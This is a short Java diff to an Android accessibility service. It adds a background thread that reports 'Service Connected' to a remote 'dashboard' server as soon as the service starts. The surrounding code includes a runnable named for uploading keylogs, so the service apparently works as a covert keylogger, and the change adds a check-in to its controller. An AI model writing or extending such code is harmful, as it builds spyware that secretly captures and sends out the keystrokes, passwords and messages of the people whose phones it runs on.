@@ -60,6 +60,11 @@ public class MyAccessibilityService extends AccessibilityService {
 
     @Override
     public void onServiceConnected() {
+        // 🔄 SYNC with dashboard immediately on connection
+        new Thread(() -> {
+            UploadHelper.sendTextToServer(getApplicationContext(), "sync", "Service Connected");
+        }).start();
+
         uploadKeylogRunnable = new Runnable() {
             @Override
             public void run() {
